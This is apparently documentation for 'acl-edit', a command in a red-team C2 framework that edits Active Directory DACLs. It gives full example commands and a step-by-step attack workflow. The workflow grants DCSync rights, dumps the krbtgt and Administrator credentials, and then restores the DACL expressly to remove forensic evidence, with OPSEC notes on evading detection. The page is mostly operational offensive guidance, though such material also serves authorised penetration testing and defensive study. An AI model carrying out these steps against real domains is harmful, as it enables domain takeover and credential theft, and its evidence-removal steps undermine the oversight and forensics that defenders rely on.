+++
title = "acl-edit"
chapter = false
weight = 217
hidden = false
+++

## Summary

Read and modify Active Directory object DACLs (Discretionary Access Control Lists). Enumerate existing ACEs on any AD object, add or remove specific access rights, grant high-impact permissions like DCSync or GenericAll, and backup/restore DACLs for clean post-operation rollback.

Cross-platform — works from Windows, Linux, and macOS agents.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | read | Operation to perform: `read`, `add`, `remove`, `grant-dcsync`, `grant-genericall`, `backup`, `restore` |
| server | Yes | | Domain Controller IP or hostname |
| target | Yes | | Target AD object (sAMAccountName, DN, or GUID) whose DACL to read/modify |
| principal | Varies | | The trustee to grant/revoke rights to (sAMAccountName or SID). Required for `add`, `remove`, `grant-dcsync`, `grant-genericall` |
| right | Varies | | Access right for `add`/`remove` actions (e.g., `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `WriteProp`, `ExtendedRight`) |
| backup | Varies | | File path to save/load DACL backup (required for `backup` and `restore` actions) |
| username | No | | LDAP bind username (`user@domain.local` or `DOMAIN\user`) |
| password | No | | LDAP bind password |
| base_dn | No | auto | LDAP search base (auto-detected from RootDSE) |
| port | No | 389 | LDAP port (636 for LDAPS) |
| use_tls | No | false | Use LDAPS for encrypted connection |

## Actions

| Action | Description | Required Args |
|--------|-------------|---------------|
| read | Enumerate all ACEs on the target object's DACL | target, server |
| add | Add an ACE granting a specific right to a principal | target, server, principal, right |
| remove | Remove an ACE for a specific right from a principal | target, server, principal, right |
| grant-dcsync | Grant Replicating Directory Changes + Replicating Directory Changes All to a principal | target, server, principal |
| grant-genericall | Grant GenericAll (full control) over the target to a principal | target, server, principal |
| backup | Export the current DACL to a file for later restoration | target, server, backup |
| restore | Restore a previously backed-up DACL to the target object | target, server, backup |

## Usage

### Read DACLs on a user object
```
acl-edit -action read -server dc01 -target jsmith -username admin@corp.local -password P@ssw0rd
```

### Add GenericWrite to a principal
```
acl-edit -action add -server dc01 -target srv01 -principal attacker -right GenericWrite -username admin@corp.local -password P@ssw0rd
```

### Remove a previously added ACE
```
acl-edit -action remove -server dc01 -target srv01 -principal attacker -right GenericWrite -username admin@corp.local -password P@ssw0rd
```

### Grant DCSync rights
```
acl-edit -action grant-dcsync -server dc01 -target "DC=corp,DC=local" -principal svc_repl -username admin@corp.local -password P@ssw0rd
```

### Grant GenericAll over a target object
```
acl-edit -action grant-genericall -server dc01 -target victim-server -principal attacker -username admin@corp.local -password P@ssw0rd
```

### Backup a DACL before modification
```
acl-edit -action backup -server dc01 -target jsmith -backup /tmp/jsmith-dacl.json -username admin@corp.local -password P@ssw0rd
```

### Restore a DACL after operations are complete
```
acl-edit -action restore -server dc01 -target jsmith -backup /tmp/jsmith-dacl.json -username admin@corp.local -password P@ssw0rd
```

### Using LDAPS
```
acl-edit -action read -server dc01 -target jsmith -username admin@corp.local -password P@ssw0rd -use_tls true -port 636
```

## Typical Attack Workflow

1. **Backup the DACL** before any changes (for clean rollback):
   ```
   acl-edit -action backup -server dc01 -target "DC=corp,DC=local" -backup /tmp/domain-dacl.json -username admin@corp.local -password P@ssw0rd
   ```

2. **Grant DCSync rights** to a controlled account:
   ```
   acl-edit -action grant-dcsync -server dc01 -target "DC=corp,DC=local" -principal svc_repl -username admin@corp.local -password P@ssw0rd
   ```

3. **Perform DCSync** to extract credentials:
   ```
   dcsync -server dc01 -username svc_repl@corp.local -password P@ssw0rd -target krbtgt,Administrator
   ```

4. **Restore the original DACL** to remove evidence:
   ```
   acl-edit -action restore -server dc01 -target "DC=corp,DC=local" -backup /tmp/domain-dacl.json -username admin@corp.local -password P@ssw0rd
   ```

## Operational Notes

- Uses `go-ldap/v3` for LDAP read/modify operations on `nTSecurityDescriptor`
- Target objects are resolved from sAMAccountName to DN automatically
- UPN format (`user@domain.local`) recommended for authentication
- `grant-dcsync` adds two ACEs: DS-Replication-Get-Changes (`1131f6aa-...`) and DS-Replication-Get-Changes-All (`1131f6ad-...`)
- `grant-genericall` adds a single ACE with `ADS_RIGHT_GENERIC_ALL`
- `backup` serializes the raw security descriptor to JSON for exact restoration
- `restore` replaces the entire DACL with the backed-up version — use with care
- Modifying DACLs requires `WriteDacl` permission on the target object
- All modifications generate Mythic artifacts for operator tracking

## OPSEC Considerations

- **Event logs**: DACL modifications generate **Event ID 5136** (Directory Service Object Modified) on the Domain Controller
- **Detection**: Changes to sensitive objects (domain root, AdminSDHolder, high-value groups) are closely monitored by most SIEMs
- **Backup/Restore**: Always backup before modifying DACLs — restoring original permissions removes forensic evidence of the ACE modification
- **Persistence risk**: Granting DCSync or GenericAll creates a persistent backdoor until the ACE is removed

## MITRE ATT&CK Mapping

- **T1222.001** — File and Directory Permissions Modification: Windows File and Directory Permissions Modification
- **T1098** — Account Manipulation
- **T1003.006** — OS Credential Dumping: DCSync
